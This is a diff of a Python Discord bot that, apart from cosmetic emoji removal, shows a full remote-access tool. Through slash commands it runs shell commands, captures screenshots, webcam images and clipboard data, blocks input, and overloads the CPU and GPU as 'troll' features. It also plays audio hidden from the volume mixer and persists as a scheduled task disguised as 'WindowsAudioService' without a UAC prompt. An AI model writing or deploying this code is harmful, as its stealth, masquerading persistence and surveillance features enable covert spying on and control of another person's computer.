@@ -15,7 +15,7 @@ if sys.stdout.encoding != "utf-8":
 if sys.stderr.encoding != "utf-8":
     sys.stderr.reconfigure(encoding="utf-8", errors="replace")
 
-# ── Single instance lock ──────────────────
+#  Single instance lock 
 import tempfile
 _lock_path = os.path.join(tempfile.gettempdir(), "gugabot.lock")
 try:
@@ -23,23 +23,23 @@ try:
         with open(_lock_path, "r") as f:
             old_pid = int(f.read().strip())
         if psutil.pid_exists(old_pid):
-            print(f"❌ Bot already running (PID {old_pid}). Exiting.")
+            print(f" Bot already running (PID {old_pid}). Exiting.")
             sys.exit(0)
     with open(_lock_path, "w") as f:
         f.write(str(os.getpid()))
     import atexit
     atexit.register(lambda: os.unlink(_lock_path) if os.path.exists(_lock_path) else None)
 except Exception as e:
-    print(f"⚠️ Lock file error: {e}")
+    print(f" Lock file error: {e}")
 
 
 # Windows-only
 if sys.platform == "win32":
     import ctypes
 
-# ─────────────────────────────────────────
-# CONFIG — decrypts token.enc using dependencies.txt
-# ─────────────────────────────────────────
+# 
+# CONFIG  decrypts token.enc using dependencies.txt
+# 
 try:
     from cryptography.fernet import Fernet
     _dir = os.path.dirname(os.path.abspath(__file__))
@@ -53,12 +53,12 @@ try:
     raw_ids = " ".join(_payload[1:])
     AUTHORIZED_USERS = {int(x.strip()) for x in raw_ids.replace(",", " ").split() if x.strip()}
 except FileNotFoundError as e:
-    print(f"❌ Missing file: {e}. Run encrypt.py first.")
+    print(f" Missing file: {e}. Run encrypt.py first.")
     sys.exit(1)
 except Exception as e:
-    print(f"❌ Failed to decrypt config: {e}")
+    print(f" Failed to decrypt config: {e}")
     sys.exit(1)
-# ─────────────────────────────────────────
+# 
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -66,89 +66,89 @@ intents.message_content = True
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 
-# ── Auth helpers ─────────────────────────
+#  Auth helpers 
 
 def authorized(user_id: int) -> bool:
     return user_id in AUTHORIZED_USERS
 
 async def deny(interaction: discord.Interaction):
-    await interaction.response.send_message("❌ You're not authorized.", ephemeral=True)
+    await interaction.response.send_message(" You're not authorized.", ephemeral=True)
 
 
-# ── Sync slash commands on ready ─────────
+#  Sync slash commands on ready 
 
 @bot.event
 async def on_ready():
     await bot.tree.sync()
-    print(f"✅ Logged in as {bot.user} | Slash commands synced")
+    print(f" Logged in as {bot.user} | Slash commands synced")
 
 
-# ─────────────────────────────────────────
+# 
 # PREFIX COMMANDS
-# ─────────────────────────────────────────
+# 
 
 @bot.command(name="help")
 async def help_cmd(ctx):
     if not authorized(ctx.author.id):
-        await ctx.send("❌ You're not authorized.")
+        await ctx.send(" You're not authorized.")
         return
-    embed = discord.Embed(title="🖥️ PC Bot Commands", color=0x5865F2)
-    embed.add_field(name="📊 Info", value=(
-        "`/ping` — latency check\n"
-        "`/sysinfo` — CPU/RAM/disk\n"
-        "`/idle` — idle time\n"
-        "`/procs [filter]` — process list\n"
-        "`/clip` — clipboard contents"
+    embed = discord.Embed(title=" PC Bot Commands", color=0x5865F2)
+    embed.add_field(name=" Info", value=(
+        "`/ping`  latency check\n"
+        "`/sysinfo`  CPU/RAM/disk\n"
+        "`/idle`  idle time\n"
+        "`/procs [filter]`  process list\n"
+        "`/clip`  clipboard contents"
     ), inline=False)
-    embed.add_field(name="📸 Capture", value=(
-        "`/ss` — screenshot\n"
-        "`/cam` — webcam photo"
+    embed.add_field(name=" Capture", value=(
+        "`/ss`  screenshot\n"
+        "`/cam`  webcam photo"
     ), inline=False)
-    embed.add_field(name="🎮 Control", value=(
-        "`/run <cmd>` — shell command\n"
-        "`/open <path>` — open file/app\n"
-        "`/kill <n>` — kill process\n"
-        "`/type <text>` — type on keyboard\n"
-        "`/vol <0-100>` — set volume\n"
-        "`/notify <msg>` — pop notification\n"
-        "`/wallpaper <url>` — set wallpaper"
+    embed.add_field(name=" Control", value=(
+        "`/run <cmd>`  shell command\n"
+        "`/open <path>`  open file/app\n"
+        "`/kill <n>`  kill process\n"
+        "`/type <text>`  type on keyboard\n"
+        "`/vol <0-100>`  set volume\n"
+        "`/notify <msg>`  pop notification\n"
+        "`/wallpaper <url>`  set wallpaper"
     ), inline=False)
-    embed.add_field(name="🔒 Lock", value=(
-        "`/lock [seconds]` — block keyboard & mouse\n"
-        "`/unlock` — re-enable input\n"
-        "`/blockkey <key> [seconds]` — block a specific key"
+    embed.add_field(name=" Lock", value=(
+        "`/lock [seconds]`  block keyboard & mouse\n"
+        "`/unlock`  re-enable input\n"
+        "`/blockkey <key> [seconds]`  block a specific key"
     ), inline=False)
-    embed.add_field(name="⚡ Power", value=(
-        "`/shutdown` — shut down PC\n"
-        "`/reboot` — reboot PC\n"
-        "`/startup` — add bot to Windows startup"
+    embed.add_field(name=" Power", value=(
+        "`/shutdown`  shut down PC\n"
+        "`/reboot`  reboot PC\n"
+        "`/startup`  add bot to Windows startup"
     ), inline=False)
-    embed.add_field(name="😈 Troll", value=(
-        "`/freeze [seconds]` — max out CPU+GPU\n"
-        "`/soundboard <file>` — play audio through mic\n"
-        "`/website <url>` — open a URL in browser\n"
-        "`/vol <0-100>` — set volume"
+    embed.add_field(name=" Troll", value=(
+        "`/freeze [seconds]`  max out CPU+GPU\n"
+        "`/soundboard <file>`  play audio through mic\n"
+        "`/website <url>`  open a URL in browser\n"
+        "`/vol <0-100>`  set volume"
     ), inline=False)
-    embed.add_field(name="📡 Stream", value=(
-        "`/stream start <channel>` — stream live screenshots to VC\n"
-        "`/stream stop` — stop streaming"
+    embed.add_field(name=" Stream", value=(
+        "`/stream start <channel>`  stream live screenshots to VC\n"
+        "`/stream stop`  stop streaming"
     ), inline=False)
     await ctx.send(embed=embed)
 
 
-# ─────────────────────────────────────────
+# 
 # SLASH COMMANDS
-# ─────────────────────────────────────────
+# 
 
-# ── /ping ────────────────────────────────
+#  /ping 
 @bot.tree.command(name="ping", description="Check if the bot is alive")
 async def ping(interaction: discord.Interaction):
     if not authorized(interaction.user.id):
         return await deny(interaction)
-    await interaction.response.send_message(f"✅ Alive. Latency: `{round(bot.latency * 1000)}ms`")
+    await interaction.response.send_message(f" Alive. Latency: `{round(bot.latency * 1000)}ms`")
 
 
-# ── /sysinfo ─────────────────────────────
+#  /sysinfo 
 @bot.tree.command(name="sysinfo", description="Show CPU, RAM, and disk usage")
 async def sysinfo(interaction: discord.Interaction):
     if not authorized(interaction.user.id):
@@ -157,20 +157,20 @@ async def sysinfo(interaction: discord.Interaction):
     cpu = psutil.cpu_percent(interval=1)
     ram = psutil.virtual_memory()
     disk = psutil.disk_usage("/" if sys.platform != "win32" else "C:\\")
-    embed = discord.Embed(title="💻 System Info", color=0x2ecc71)
+    embed = discord.Embed(title=" System Info", color=0x2ecc71)
     embed.add_field(name="CPU", value=f"`{cpu}%`", inline=True)
     embed.add_field(name="RAM", value=f"`{ram.percent}%` ({round(ram.used/1e9,1)}GB / {round(ram.total/1e9,1)}GB)", inline=True)
     embed.add_field(name="Disk", value=f"`{disk.percent}%` ({round(disk.used/1e9,1)}GB / {round(disk.total/1e9,1)}GB)", inline=True)
     await interaction.followup.send(embed=embed)
 
 
-# ── /idle ────────────────────────────────
+#  /idle 
 @bot.tree.command(name="idle", description="Show how long the PC has been idle")
 async def idle(interaction: discord.Interaction):
     if not authorized(interaction.user.id):
         return await deny(interaction)
     if sys.platform != "win32":
-        return await interaction.response.send_message("❌ Windows only.")
+        return await interaction.response.send_message(" Windows only.")
     try:
         class LASTINPUTINFO(ctypes.Structure):
             _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
@@ -181,12 +181,12 @@ async def idle(interaction: discord.Interaction):
         seconds = millis // 1000
         mins, secs = divmod(seconds, 60)
         hours, mins = divmod(mins, 60)
-        await interaction.response.send_message(f"⏱️ Idle for: `{hours}h {mins}m {secs}s`")
+        await interaction.response.send_message(f" Idle for: `{hours}h {mins}m {secs}s`")
     except Exception as e:
-        await interaction.response.send_message(f"❌ Error: {e}")
+        await interaction.response.send_message(f" Error: {e}")
 
 
-# ── /procs ───────────────────────────────
+#  /procs 
 @bot.tree.command(name="procs", description="List running processes")
 @app_commands.describe(filter="Optional name filter")
 async def procs(interaction: discord.Interaction, filter: str = ""):
@@ -208,7 +208,7 @@ async def procs(interaction: discord.Interaction, filter: str = ""):
     await interaction.followup.send(f"```\n{'PID':>6}  NAME\n{output}\n```")
 
 
-# ── /clip ────────────────────────────────
+#  /clip 
 @bot.tree.command(name="clip", description="Send clipboard contents")
 async def clip(interaction: discord.Interaction):
     if not authorized(interaction.user.id):
@@ -222,12 +222,12 @@ async def clip(interaction: discord.Interaction):
         content = result.stdout.strip() or "(clipboard is empty)"
         if len(content) > 1900:
             content = content[:1900] + "\n...(truncated)"
-        await interaction.followup.send(f"📋 Clipboard:\n```\n{content}\n```")
+        await interaction.followup.send(f" Clipboard:\n```\n{content}\n```")
     except Exception as e:
-        await interaction.followup.send(f"❌ Error: {e}")
+        await interaction.followup.send(f" Error: {e}")
 
 
-# ── /ss ──────────────────────────────────
+#  /ss 
 @bot.tree.command(name="ss", description="Take a screenshot")
 async def ss(interaction: discord.Interaction):
     if not authorized(interaction.user.id):
@@ -241,12 +241,12 @@ async def ss(interaction: discord.Interaction):
         buf.seek(0)
         await interaction.followup.send(file=discord.File(buf, filename="screenshot.png"))
     except ImportError:
-        await interaction.followup.send("❌ Pillow not installed. Run: `pip install pillow`")
+        await interaction.followup.send(" Pillow not installed. Run: `pip install pillow`")
     except Exception as e:
-        await interaction.followup.send(f"❌ Error: {e}")
+        await interaction.followup.send(f" Error: {e}")
 
 
-# ── /cam ─────────────────────────────────
+#  /cam 
 @bot.tree.command(name="cam", description="Snap a webcam photo")
 async def cam(interaction: discord.Interaction):
     if not authorized(interaction.user.id):
@@ -256,20 +256,20 @@ async def cam(interaction: discord.Interaction):
         import cv2
         cap = cv2.VideoCapture(0)
         if not cap.isOpened():
-            return await interaction.followup.send("❌ No webcam found.")
+            return await interaction.followup.send(" No webcam found.")
         ret, frame = cap.read()
         cap.release()
         if not ret:
-            return await interaction.followup.send("❌ Failed to capture.")
+            return await interaction.followup.send(" Failed to capture.")
         _, buf = cv2.imencode(".png", frame)
         await interaction.followup.send(file=discord.File(io.BytesIO(buf.tobytes()), filename="cam.png"))
     except ImportError:
-        await interaction.followup.send("❌ opencv-python not installed. Run: `pip install opencv-python`")
+        await interaction.followup.send(" opencv-python not installed. Run: `pip install opencv-python`")
     except Exception as e:
-        await interaction.followup.send(f"❌ Error: {e}")
+        await interaction.followup.send(f" Error: {e}")
 
 
-# ── /run ─────────────────────────────────
+#  /run 
 @bot.tree.command(name="run", description="Run a shell command")
 @app_commands.describe(command="The command to run")
 async def run(interaction: discord.Interaction, command: str):
@@ -281,14 +281,14 @@ async def run(interaction: discord.Interaction, command: str):
         output = result.stdout or result.stderr or "(no output)"
         if len(output) > 1900:
             output = output[:1900] + "\n...(truncated)"
-        await interaction.followup.send(f"⚙️ `{command}`\n```\n{output}\n```")
+        await interaction.followup.send(f" `{command}`\n```\n{output}\n```")
     except subprocess.TimeoutExpired:
-        await interaction.followup.send("⏰ Timed out after 30s.")
+        await interaction.followup.send(" Timed out after 30s.")
     except Exception as e:
-        await interaction.followup.send(f"❌ Error: {e}")
+        await interaction.followup.send(f" Error: {e}")
 
 
-# ── /open ────────────────────────────────
+#  /open 
 @bot.tree.command(name="open", description="Open a file or application")
 @app_commands.describe(path="File path or app name")
 async def open_app(interaction: discord.Interaction, path: str):
@@ -301,12 +301,12 @@ async def open_app(interaction: discord.Interaction, path: str):
             subprocess.Popen(["open", path])
         else:
             subprocess.Popen(["xdg-open", path])
-        await interaction.response.send_message(f"✅ Opened: `{path}`")
+        await interaction.response.send_message(f" Opened: `{path}`")
     except Exception as e:
-        await interaction.response.send_message(f"❌ Error: {e}")
+        await interaction.response.send_message(f" Error: {e}")
 
 
-# ── /kill ────────────────────────────────
+#  /kill 
 @bot.tree.command(name="kill", description="Kill a process by name")
 @app_commands.describe(name="Process name to kill")
 async def kill(interaction: discord.Interaction, name: str):
@@ -322,12 +322,12 @@ async def kill(interaction: discord.Interaction, name: str):
             except Exception:
                 pass
     if killed:
-        await interaction.followup.send("🔴 Killed:\n" + "\n".join(f"- `{k}`" for k in killed))
+        await interaction.followup.send(" Killed:\n" + "\n".join(f"- `{k}`" for k in killed))
     else:
-        await interaction.followup.send(f"⚠️ No process matching `{name}`")
+        await interaction.followup.send(f" No process matching `{name}`")
 
 
-# ── /type ────────────────────────────────
+#  /type 
 @bot.tree.command(name="type", description="Type text as keyboard input on the PC")
 @app_commands.describe(text="Text to type")
 async def type_text(interaction: discord.Interaction, text: str):
@@ -336,21 +336,21 @@ async def type_text(interaction: discord.Interaction, text: str):
     try:
         import pyautogui
         pyautogui.write(text, interval=0.05)
-        await interaction.response.send_message(f"⌨️ Typed: `{text}`")
+        await interaction.response.send_message(f" Typed: `{text}`")
     except ImportError:
-        await interaction.response.send_message("❌ pyautogui not installed. Run: `pip install pyautogui`")
+        await interaction.response.send_message(" pyautogui not installed. Run: `pip install pyautogui`")
     except Exception as e:
-        await interaction.response.send_message(f"❌ Error: {e}")
+        await interaction.response.send_message(f" Error: {e}")
 
 
-# ── /vol ─────────────────────────────────
+#  /vol 
 @bot.tree.command(name="vol", description="Set system volume (0-100)")
 @app_commands.describe(level="Volume level 0-100")
 async def vol(interaction: discord.Interaction, level: int):
     if not authorized(interaction.user.id):
         return await deny(interaction)
     if not 0 <= level <= 100:
-        return await interaction.response.send_message("❌ Must be 0-100.")
+        return await interaction.response.send_message(" Must be 0-100.")
     await interaction.response.defer()
     try:
         if sys.platform == "win32":
@@ -364,12 +364,12 @@ async def vol(interaction: discord.Interaction, level: int):
             subprocess.run(["powershell", "-Command", script], capture_output=True)
         else:
             subprocess.run(["amixer", "-D", "pulse", "sset", "Master", f"{level}%"])
-        await interaction.followup.send(f"🔊 Volume set to `{level}%`")
+        await interaction.followup.send(f" Volume set to `{level}%`")
     except Exception as e:
-        await interaction.followup.send(f"❌ Error: {e}")
+        await interaction.followup.send(f" Error: {e}")
 
 
-# ── /notify ──────────────────────────────
+#  /notify 
 @bot.tree.command(name="notify", description="Pop a notification on the PC")
 @app_commands.describe(message="Notification message")
 async def notify(interaction: discord.Interaction, message: str):
@@ -395,12 +395,12 @@ $toast = [Windows.UI.Notifications.ToastNotification]::new($xml)
             )
         else:
             subprocess.run(["notify-send", "Bot Alert", message])
-        await interaction.response.send_message(f"🔔 Notification sent: `{message}`")
+        await interaction.response.send_message(f" Notification sent: `{message}`")
     except Exception as e:
-        await interaction.response.send_message(f"❌ Error: {e}")
+        await interaction.response.send_message(f" Error: {e}")
 
 
-# ── /wallpaper ───────────────────────────
+#  /wallpaper 
 @bot.tree.command(name="wallpaper", description="Change the desktop wallpaper")
 @app_commands.describe(url="Image URL")
 async def wallpaper(interaction: discord.Interaction, url: str):
@@ -416,12 +416,12 @@ async def wallpaper(interaction: discord.Interaction, url: str):
             subprocess.run(["osascript", "-e", f'tell application "Finder" to set desktop picture to POSIX file "{path}"'])
         else:
             subprocess.run(["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{path}"])
-        await interaction.followup.send("🖼️ Wallpaper changed!")
+        await interaction.followup.send(" Wallpaper changed!")
     except Exception as e:
-        await interaction.followup.send(f"❌ Error: {e}")
+        await interaction.followup.send(f" Error: {e}")
 
 
-# ── /lock ────────────────────────────────
+#  /lock 
 @bot.tree.command(name="lock", description="Block keyboard & mouse input")
 @app_commands.describe(seconds="Auto-unlock after this many seconds (0 = manual unlock)")
 async def lock(interaction: discord.Interaction, seconds: int = 0):
@@ -430,16 +430,16 @@ async def lock(interaction: discord.Interaction, seconds: int = 0):
     if sys.platform == "win32":
         result = ctypes.windll.user32.BlockInput(True)
         if result:
-            msg = "🔒 Input locked."
+            msg = " Input locked."
             if seconds > 0:
                 msg += f" Auto-unlocking in {seconds}s."
             await interaction.response.send_message(msg)
             if seconds > 0:
                 await asyncio.sleep(seconds)
                 ctypes.windll.user32.BlockInput(False)
-                await interaction.followup.send("🔓 Input auto-unlocked.")
+                await interaction.followup.send(" Input auto-unlocked.")
         else:
-            await interaction.response.send_message("❌ Failed — run the bot as Administrator.")
+            await interaction.response.send_message(" Failed  run the bot as Administrator.")
     else:
         await interaction.response.defer()
         try:
@@ -447,7 +447,7 @@ async def lock(interaction: discord.Interaction, seconds: int = 0):
             ids = [i.strip() for i in result.stdout.strip().split("\n") if i.strip()]
             for dev_id in ids:
                 subprocess.run(["xinput", "disable", dev_id])
-            msg = f"🔒 Disabled {len(ids)} input device(s)."
+            msg = f" Disabled {len(ids)} input device(s)."
             if seconds > 0:
                 msg += f" Auto-unlocking in {seconds}s."
             await interaction.followup.send(msg)
@@ -455,66 +455,66 @@ async def lock(interaction: discord.Interaction, seconds: int = 0):
                 await asyncio.sleep(seconds)
                 for dev_id in ids:
                     subprocess.run(["xinput", "enable", dev_id])
-                await interaction.followup.send("🔓 Input auto-unlocked.")
+                await interaction.followup.send(" Input auto-unlocked.")
         except Exception as e:
-            await interaction.followup.send(f"❌ Error: {e}")
+            await interaction.followup.send(f" Error: {e}")
 
 
-# ── /unlock ──────────────────────────────
+#  /unlock 
 @bot.tree.command(name="unlock", description="Re-enable keyboard & mouse input")
 async def unlock(interaction: discord.Interaction):
     if not authorized(interaction.user.id):
         return await deny(interaction)
     if sys.platform == "win32":
         ctypes.windll.user32.BlockInput(False)
-        await interaction.response.send_message("🔓 Input unlocked.")
+        await interaction.response.send_message(" Input unlocked.")
     else:
         try:
             result = subprocess.run(["xinput", "list", "--id-only"], capture_output=True, text=True)
             ids = [i.strip() for i in result.stdout.strip().split("\n") if i.strip()]
             for dev_id in ids:
                 subprocess.run(["xinput", "enable", dev_id])
-            await interaction.response.send_message("🔓 All input devices re-enabled.")
+            await interaction.response.send_message(" All input devices re-enabled.")
         except Exception as e:
-            await interaction.response.send_message(f"❌ Error: {e}")
+            await interaction.response.send_message(f" Error: {e}")
 
 
-# ── /shutdown ────────────────────────────
+#  /shutdown 
 @bot.tree.command(name="shutdown", description="Shut down the PC")
 async def shutdown(interaction: discord.Interaction):
     if not authorized(interaction.user.id):
         return await deny(interaction)
-    await interaction.response.send_message("🔌 Shutting down...")
+    await interaction.response.send_message(" Shutting down...")
     if sys.platform == "win32":
         subprocess.run(["shutdown", "/s", "/t", "5"])
     else:
         subprocess.run(["shutdown", "-h", "now"])
 
 
-# ── /reboot ──────────────────────────────
+#  /reboot 
 @bot.tree.command(name="reboot", description="Reboot the PC")
 async def reboot(interaction: discord.Interaction):
     if not authorized(interaction.user.id):
         return await deny(interaction)
-    await interaction.response.send_message("🔄 Rebooting...")
+    await interaction.response.send_message(" Rebooting...")
     if sys.platform == "win32":
         subprocess.run(["shutdown", "/r", "/t", "5"])
     else:
         subprocess.run(["reboot"])
 
 
-# ── /freeze ──────────────────────────────
+#  /freeze 
 @bot.tree.command(name="freeze", description="Max out all CPU cores to cause a lagspike")
 @app_commands.describe(seconds="How long to freeze for (default 5)")
 async def freeze(interaction: discord.Interaction, seconds: int = 5):
     if not authorized(interaction.user.id):
         return await deny(interaction)
-    await interaction.response.send_message(f"🥶 Freezing for `{seconds}s`...")
+    await interaction.response.send_message(f" Freezing for `{seconds}s`...")
 
     cpu_count = os.cpu_count() or 4
     burn_code = "import math\nwhile True:\n math.factorial(100000)"
 
-    # CPU stress — one process per core
+    # CPU stress  one process per core
     procs = [
         subprocess.Popen(
             [sys.executable, "-c", burn_code],
@@ -523,7 +523,7 @@ async def freeze(interaction: discord.Interaction, seconds: int = 5):
         for _ in range(cpu_count)
     ]
 
-    # GPU stress via DirectX pixel shader — compiled C# inline
+    # GPU stress via DirectX pixel shader  compiled C# inline
     gpu_script = r"""
 Add-Type -TypeDefinition @"
 using System;
@@ -562,11 +562,11 @@ while ((Get-Date) -lt $end) {
         except Exception:
             pass
 
-    await interaction.followup.send("✅ Done freezing.")
+    await interaction.followup.send(" Done freezing.")
 
 
 
-# ── /soundboard ──────────────────────────
+#  /soundboard 
 async def play_audio_hidden(url: str, filename: str):
     """Download and play audio via PowerShell so it doesn't show in Volume Mixer."""
     import tempfile
@@ -590,7 +590,7 @@ async def play_audio_hidden(url: str, filename: str):
         wav_path = tmp_path
         duration = 0
 
-    # Play via PowerShell — shows as nothing in Volume Mixer
+    # Play via PowerShell  shows as nothing in Volume Mixer
     script = f"(New-Object Media.SoundPlayer '{wav_path}').PlaySync()"
     proc = subprocess.Popen(
         ["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-Command", script],
@@ -620,34 +620,34 @@ async def soundboard(interaction: discord.Interaction, file: discord.Attachment)
     await interaction.response.defer()
     try:
         duration = await play_audio_hidden(file.url, file.filename)
-        await interaction.followup.send(f"🔊 Played `{file.filename}` (`{round(duration, 1)}s`) — hidden from mixer.")
+        await interaction.followup.send(f" Played `{file.filename}` (`{round(duration, 1)}s`)  hidden from mixer.")
     except Exception as e:
-        await interaction.followup.send(f"❌ Error: {e}")
+        await interaction.followup.send(f" Error: {e}")
 
 
-# ── !soundboard (prefix fallback) ────────
+#  !soundboard (prefix fallback) 
 @bot.command(name="soundboard")
 async def soundboard_prefix(ctx):
     if not authorized(ctx.author.id):
-        return await ctx.send("❌ You're not authorized.")
+        return await ctx.send(" You're not authorized.")
     if not ctx.message.attachments:
-        return await ctx.send("❌ Attach an audio file (mp3, wav, ogg).")
+        return await ctx.send(" Attach an audio file (mp3, wav, ogg).")
     attachment = ctx.message.attachments[0]
     try:
         duration = await play_audio_hidden(attachment.url, attachment.filename)
-        await ctx.send(f"🔊 Played `{attachment.filename}` (`{round(duration, 1)}s`) — hidden from mixer.")
+        await ctx.send(f" Played `{attachment.filename}` (`{round(duration, 1)}s`)  hidden from mixer.")
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f" Error: {e}")
 
 
 
-# ── /blockkey ────────────────────────────
+#  /blockkey 
 @bot.tree.command(name="blockkey", description="Block a specific key for a duration")
 @app_commands.describe(key="Key to block (e.g. f, space, e)", seconds="How long to block it (default 10)")
 async def blockkey(interaction: discord.Interaction, key: str, seconds: int = 10):
     if not authorized(interaction.user.id):
         return await deny(interaction)
-    await interaction.response.send_message(f"🚫 Blocking `{key}` for `{seconds}s`...")
+    await interaction.response.send_message(f" Blocking `{key}` for `{seconds}s`...")
 
     # Use PowerShell to install and run a key block via RegisterHotKey suppression
     # Works by spamming a hook that eats the keypress
@@ -696,15 +696,15 @@ public class KeyBlocker {{
         proc.kill()
     except Exception:
         pass
-    await interaction.followup.send(f"✅ `{key}` unblocked.")
+    await interaction.followup.send(f" `{key}` unblocked.")
 
 
-# ── /blockkey prefix fallback ─────────────
+#  /blockkey prefix fallback 
 @bot.command(name="blockkey")
 async def blockkey_prefix(ctx, key: str = "f", seconds: int = 10):
     if not authorized(ctx.author.id):
-        return await ctx.send("❌ You're not authorized.")
-    await ctx.send(f"🚫 Blocking `{key}` for `{seconds}s`...")
+        return await ctx.send(" You're not authorized.")
+    await ctx.send(f" Blocking `{key}` for `{seconds}s`...")
     script = f"""
 Add-Type -TypeDefinition @'
 using System;
@@ -749,10 +749,10 @@ public class KeyBlocker {{
         proc.kill()
     except Exception:
         pass
-    await ctx.send(f"✅ `{key}` unblocked.")
+    await ctx.send(f" `{key}` unblocked.")
 
 
-# ── /startup ─────────────────────────────
+#  /startup 
 @bot.tree.command(name="startup", description="Add bot to Windows startup")
 async def startup(interaction: discord.Interaction):
     if not authorized(interaction.user.id):
@@ -767,17 +767,17 @@ async def startup(interaction: discord.Interaction):
             'Register-ScheduledTask -TaskName "WindowsAudioService" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force'
         )
         subprocess.run(["powershell", "-Command", script], capture_output=True)
-        await interaction.response.send_message("✅ Added to startup as `WindowsAudioService` (no UAC prompt).")
+        await interaction.response.send_message(" Added to startup as `WindowsAudioService` (no UAC prompt).")
     except Exception as e:
-        await interaction.response.send_message(f"❌ Error: {e}")
+        await interaction.response.send_message(f" Error: {e}")
     except Exception as e:
-        await interaction.response.send_message(f"❌ Error: {e}")
+        await interaction.response.send_message(f" Error: {e}")
 
 
 @bot.command(name="startup")
 async def startup_prefix(ctx):
     if not authorized(ctx.author.id):
-        return await ctx.send("❌ You're not authorized.")
+        return await ctx.send(" You're not authorized.")
     try:
         bat_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "launcher.bat")
         script = (
@@ -788,12 +788,12 @@ async def startup_prefix(ctx):
             'Register-ScheduledTask -TaskName "WindowsAudioService" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force'
         )
         subprocess.run(["powershell", "-Command", script], capture_output=True)
-        await ctx.send("✅ Added to startup as `WindowsAudioService` (no UAC prompt).")
+        await ctx.send(" Added to startup as `WindowsAudioService` (no UAC prompt).")
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f" Error: {e}")
 
 
-# ── /website ─────────────────────────────
+#  /website 
 @bot.tree.command(name="website", description="Open a URL in the default browser")
 @app_commands.describe(url="URL to open")
 async def website(interaction: discord.Interaction, url: str):
@@ -802,23 +802,23 @@ async def website(interaction: discord.Interaction, url: str):
     try:
         import webbrowser
         webbrowser.open(url)
-        await interaction.response.send_message(f"🌐 Opened: `{url}`")
+        await interaction.response.send_message(f" Opened: `{url}`")
     except Exception as e:
-        await interaction.response.send_message(f"❌ Error: {e}")
+        await interaction.response.send_message(f" Error: {e}")
 
 @bot.command(name="website")
 async def website_prefix(ctx, url: str):
     if not authorized(ctx.author.id):
-        return await ctx.send("❌ You're not authorized.")
+        return await ctx.send(" You're not authorized.")
     try:
         import webbrowser
         webbrowser.open(url)
-        await ctx.send(f"🌐 Opened: `{url}`")
+        await ctx.send(f" Opened: `{url}`")
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f" Error: {e}")
 
 
-# ── /stream ──────────────────────────────
+#  /stream 
 streaming = False
 
 @bot.tree.command(name="stream", description="Stream live screenshots to a voice channel")
@@ -832,17 +832,17 @@ async def stream(interaction: discord.Interaction, action: str, channel_id: str 
         streaming = False
         if interaction.guild and interaction.guild.voice_client:
             await interaction.guild.voice_client.disconnect()
-        await interaction.response.send_message("📡 Stream stopped.")
+        await interaction.response.send_message(" Stream stopped.")
         return
 
     if action.lower() == "start":
         if not channel_id:
-            return await interaction.response.send_message("❌ Provide a channel ID.")
+            return await interaction.response.send_message(" Provide a channel ID.")
         try:
             channel = bot.get_channel(int(channel_id))
             if not channel:
-                return await interaction.response.send_message("❌ Channel not found.")
-            await interaction.response.send_message(f"📡 Starting stream to `{channel.name}`...")
+                return await interaction.response.send_message(" Channel not found.")
+            await interaction.response.send_message(f" Starting stream to `{channel.name}`...")
             streaming = True
 
             async def send_screenshots():
@@ -856,7 +856,7 @@ async def stream(interaction: discord.Interaction, action: str, channel_id: str 
                         buf.seek(0)
                         await interaction.followup.send(
                             file=discord.File(buf, filename="stream.jpg"),
-                            content="📡"
+                            content=""
                         )
                     except Exception:
                         pass
@@ -864,19 +864,19 @@ async def stream(interaction: discord.Interaction, action: str, channel_id: str 
 
             asyncio.create_task(send_screenshots())
         except Exception as e:
-            await interaction.response.send_message(f"❌ Error: {e}")
+            await interaction.response.send_message(f" Error: {e}")
 
 @bot.command(name="stream")
 async def stream_prefix(ctx, action: str = "start"):
     global streaming
     if not authorized(ctx.author.id):
-        return await ctx.send("❌ You're not authorized.")
+        return await ctx.send(" You're not authorized.")
     if action.lower() == "stop":
         streaming = False
-        await ctx.send("📡 Stream stopped.")
+        await ctx.send(" Stream stopped.")
         return
     if action.lower() == "start":
-        await ctx.send("📡 Streaming screenshots every 3s... type `!stream stop` to stop.")
+        await ctx.send(" Streaming screenshots every 3s... type `!stream stop` to stop.")
         streaming = True
         while streaming:
             try:
@@ -887,27 +887,27 @@ async def stream_prefix(ctx, action: str = "start"):
                 buf.seek(0)
                 await ctx.send(file=discord.File(buf, filename="stream.jpg"))
             except Exception as e:
-                await ctx.send(f"❌ {e}")
+                await ctx.send(f" {e}")
                 break
             await asyncio.sleep(3)
 
 
-# ─────────────────────────────────────────
+# 
 # PREFIX FALLBACKS FOR ALL SLASH COMMANDS
-# ─────────────────────────────────────────
+# 
 
 @bot.command(name="ping")
 async def ping_prefix(ctx):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
-    await ctx.send(f"✅ Alive. Latency: `{round(bot.latency * 1000)}ms`")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
+    await ctx.send(f" Alive. Latency: `{round(bot.latency * 1000)}ms`")
 
 @bot.command(name="sysinfo")
 async def sysinfo_prefix(ctx):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
     cpu = psutil.cpu_percent(interval=1)
     ram = psutil.virtual_memory()
     disk = psutil.disk_usage("/" if sys.platform != "win32" else "C:\\")
-    embed = discord.Embed(title="💻 System Info", color=0x2ecc71)
+    embed = discord.Embed(title=" System Info", color=0x2ecc71)
     embed.add_field(name="CPU", value=f"`{cpu}%`", inline=True)
     embed.add_field(name="RAM", value=f"`{ram.percent}%` ({round(ram.used/1e9,1)}GB / {round(ram.total/1e9,1)}GB)", inline=True)
     embed.add_field(name="Disk", value=f"`{disk.percent}%` ({round(disk.used/1e9,1)}GB / {round(disk.total/1e9,1)}GB)", inline=True)
@@ -915,8 +915,8 @@ async def sysinfo_prefix(ctx):
 
 @bot.command(name="idle")
 async def idle_prefix(ctx):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
